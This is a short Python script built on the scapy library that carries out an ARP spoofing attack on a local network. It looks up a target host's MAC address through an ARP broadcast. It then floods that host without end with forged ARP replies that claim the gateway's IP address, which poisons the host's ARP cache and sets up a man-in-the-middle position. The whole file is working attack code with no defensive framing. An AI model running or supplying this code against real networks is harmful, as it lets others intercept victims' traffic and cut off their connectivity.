from scapy.all import Ether,ARP,IP,send,srp



  # Print the details of the empty frame

def Arp_Spoof_Attack(victim_ip , traget_MAC,spoof_ip):
    packet = ARP()
    packet[ARP].hwdst=traget_MAC
    packet[ARP].pdst=victim_ip
    packet[ARP].psrc=spoof_ip
    packet[ARP].op='is-at'

    #print(packet.show())
    while True:
      send(packet)

def Get_Mac(ip):
    arp_request_packet =Ether()/ARP()
    arp_request_packet[Ether].dst="ff:ff:ff:ff:ff:ff"
    arp_request_packet[ARP].pdst=ip
    reply,_=srp(arp_request_packet,timeout=3, verbose=False)

    if reply:
        mac=reply[0][1].hwsrc
        return mac
    return None

gate_way_ip='10.0.0.138'
target_ip = '10.0.0.18'
target_MAC=None

while not target_MAC:
    target_MAC=Get_Mac(target_ip)
    if not target_MAC:
        print('Mac not found')
print('Target Mac Address is',target_MAC)


#Get_Mac('10.0.0.18')
Arp_Spoof_Attack(target_ip,target_MAC,gate_way_ip)